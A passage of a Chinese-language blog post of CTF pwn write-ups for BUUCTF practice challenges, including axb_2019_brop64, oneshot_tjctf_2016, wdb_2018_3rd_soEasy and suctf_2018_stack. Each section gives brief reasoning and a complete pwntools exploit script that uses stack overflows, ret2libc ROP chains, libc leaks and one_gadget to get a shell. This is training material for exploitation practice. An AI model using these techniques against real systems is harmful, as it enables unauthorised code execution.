<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./axb&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27382</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./axb&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_addr = <span class="number">0x400845</span></span><br><span class="line"><span class="comment">#payload = b&quot;If there is a chance,I won&#x27;t make any mistake!\n&quot;+b&#x27;\x00&#x27;</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_addr = <span class="number">0x400963</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc0</span>+<span class="number">24</span>)+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(<span class="number">0x400845</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr  -----&gt; &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">base_libc = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;base_libc  ------&gt; &#x27;</span>,<span class="built_in">hex</span>(base_libc))</span><br><span class="line">system_addr = base_libc+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system_addr  ------&gt; &#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line">binsh_addr = base_libc+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;binsh_addr  ------&gt; &#x27;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">ret_addr = <span class="number">0x400629</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc0</span>+<span class="number">24</span>)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(ret_addr)+p64(system_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041030490.png" alt="image-20240224151900029"></p>
<h2 id="oneshot-tjctf-2016"><a href="#oneshot-tjctf-2016" class="headerlink" title="oneshot_tjctf_2016"></a><code>oneshot_tjctf_2016</code></h2><p>​	本题先泄漏<code>libc</code>然后用<code>one_gadget</code>获取<code>shell</code>即可。有一点就是刚开始用<code>p64</code>包裹地址不行，后来看网上的<code>wp</code>发现要用<code>str</code>发送。</p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./2016&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25510</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload = <span class="built_in">str</span>(puts_got)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Value: &#x27;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr  -------&gt; &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">base_libc_addr = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0x45216</span></span><br><span class="line">one_gadget_addr = one_gadget_offset+base_libc_addr</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_gadget_offset  ------&gt; &#x27;</span>,<span class="built_in">hex</span>(one_gadget_offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_gadget_addr  ------&gt; &#x27;</span>,<span class="built_in">hex</span>(one_gadget_addr))</span><br><span class="line">payload = <span class="built_in">str</span>(one_gadget_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>shell</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041030015.png" alt="image-20240226185151921"></p>
<h2 id="wdb-2018-3rd-soEasy"><a href="#wdb-2018-3rd-soEasy" class="headerlink" title="wdb_2018_3rd_soEasy"></a><code>wdb_2018_3rd_soEasy</code></h2><p>​	本题没有开<code>PIE,canary</code>保护，源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">72</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hei,give you a gift-&gt;%p\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;what do you want to do?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x64</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	可以栈溢出，溢出<code>24</code>字节，程序中没有后门函数。有输出函数，想到<code>ret2libc</code>，打印出<code>puts</code>函数的实际地址泄漏<code>libc</code>，用<code>one_gadget</code>获取<code>shell</code>。</p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./wdb&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25725</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./wdb&#x27;</span>)</span><br><span class="line">libc =ELF(<span class="string">&#x27;./libc-2.23.so-32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;do?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">76</span>+p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p32(<span class="number">0x0804850b</span>)+p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr  ------&gt; &#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base_addr = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget_addr = <span class="number">0x3a80c</span>+libc_base_addr</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">76</span>+p32(one_gadget_addr)+p32(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041030836.png" alt="image-20240227124048519"></p>
<h2 id="suctf-2018-stack"><a href="#suctf-2018-stack" class="headerlink" title="suctf_2018_stack"></a><code>suctf_2018_stack</code></h2><p>​	本题没有开任何保护，有栈溢出，可溢出<code>8</code>个字节，程序中有后门函数。思路是覆盖返回地址为后门函数的地址，要注意的是要栈对齐，这里我们采用第二种方法，对后门函数地址<code>+1</code>即可。</p>
<p><code>exp</code>如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./suctf&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26460</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">paylaod = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(<span class="number">0x400676</span>+<span class="number">1</span>)</span><br><span class="line">p.send(paylaod)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://gitee.com/Qwen11/pic/raw/master/202403041030467.png" alt="image-20240303135821416"></p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/12/16/hello-world/" rel="prev" title="Hello World">
      <i class="fa fa-chevron-left"></i> Hello World
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80"><span class="nav-number">1.</span> <span class="nav-text">一</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#picoctf-2018-rop-chain"><span class="nav-number">1.1.</span> <span class="nav-text">picoctf_2018_rop chain</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bjdctf-2020-router"><span class="nav-number">1.2.</span> <span class="nav-text">bjdctf_2020_router</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mrctf2020-easyoverflow"><span class="nav-number">1.3.</span> <span class="nav-text">mrctf2020_easyoverflow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.3.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wustctf2020-getshell-2"><span class="nav-number">1.4.</span> <span class="nav-text">wustctf2020_getshell_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wustctf2020-closed-%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91"><span class="nav-number">1.5.</span> <span class="nav-text">wustctf2020_closed(输出重定向)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#others-babystack-canary"><span class="nav-number">1.6.</span> <span class="nav-text">others_babystack(canary)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#picoctf-2018-got-shell"><span class="nav-number">1.7.</span> <span class="nav-text">picoctf_2018_got_shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mrctf2020-shellcode-revenge-%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode"><span class="nav-number">1.8.</span> <span class="nav-text">mrctf2020_shellcode_revenge(可见字符shellcode)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">1.8.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x-ctf-b0verfl0w-sub-esp-0x28-jmp-esp"><span class="nav-number">1.9.</span> <span class="nav-text">x_ctf_b0verfl0w(sub esp,0x28;jmp esp)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-number">1.9.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Not-Bad-orw-mmap"><span class="nav-number">1.10.</span> <span class="nav-text">[极客大挑战 2019]Not Bad(orw,mmap)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.10.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-3"><span class="nav-number">1.10.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#picoctf-2018-leak-me"><span class="nav-number">1.11.</span> <span class="nav-text">picoctf_2018_leak_me</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-4"><span class="nav-number">1.11.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-gettingstart"><span class="nav-number">1.12.</span> <span class="nav-text">护网杯_2018_gettingstart</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-5"><span class="nav-number">1.12.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#picoctf-2018-buffer-overflow-0-signal"><span class="nav-number">1.13.</span> <span class="nav-text">picoctf_2018_buffer overflow 0(signal)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C"><span class="nav-number">2.</span> <span class="nav-text">二</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HarekazeCTF2019-baby-rop2"><span class="nav-number">2.1.</span> <span class="nav-text">[HarekazeCTF2019]baby_rop2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#picoctf-2018-buffer-overflow-2"><span class="nav-number">2.2.</span> <span class="nav-text">picoctf_2018_buffer overflow 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xdctf2015-pwn200"><span class="nav-number">2.3.</span> <span class="nav-text">xdctf2015_pwn200</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level4"><span class="nav-number">2.4.</span> <span class="nav-text">jarvisoj_level4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wustctf2020-getshell"><span class="nav-number">2.5.</span> <span class="nav-text">wustctf2020_getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#picoctf-2018-buffer-overflow-1"><span class="nav-number">2.6.</span> <span class="nav-text">picoctf_2018_buffer overflow 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-test-your-memory"><span class="nav-number">2.7.</span> <span class="nav-text">jarvisoj_test_your_memory</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bbys-tu-2016"><span class="nav-number">2.8.</span> <span class="nav-text">bbys_tu_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-s-4"><span class="nav-number">2.9.</span> <span class="nav-text">ciscn_2019_s_4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level1"><span class="nav-number">2.10.</span> <span class="nav-text">jarvisoj_level1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wdb-2018-2nd-easyfmt"><span class="nav-number">2.11.</span> <span class="nav-text">wdb_2018_2nd_easyfmt</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#picoctf-2018-shellcode"><span class="nav-number">2.12.</span> <span class="nav-text">picoctf_2018_shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarvisoj-level5"><span class="nav-number">2.13.</span> <span class="nav-text">jarvisoj_level5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#suctf-2018-basic-pwn"><span class="nav-number">2.14.</span> <span class="nav-text">suctf_2018_basic pwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#inndy-echo"><span class="nav-number">2.15.</span> <span class="nav-text">inndy_echo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cmcc-pwnme1"><span class="nav-number">2.16.</span> <span class="nav-text">cmcc_pwnme1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#axb-2019-brop64"><span class="nav-number">2.17.</span> <span class="nav-text">axb_2019_brop64</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#oneshot-tjctf-2016"><span class="nav-number">2.18.</span> <span class="nav-text">oneshot_tjctf_2016</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wdb-2018-3rd-soEasy"><span class="nav-number">2.19.</span> <span class="nav-text">wdb_2018_3rd_soEasy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#suctf-2018-stack"><span class="nav-number">2.20.</span> <span class="nav-text">suctf_2018_stack</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">wen</p>
  <div class="site-description" itemprop="description">Here's what you want.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">2</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">wen</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
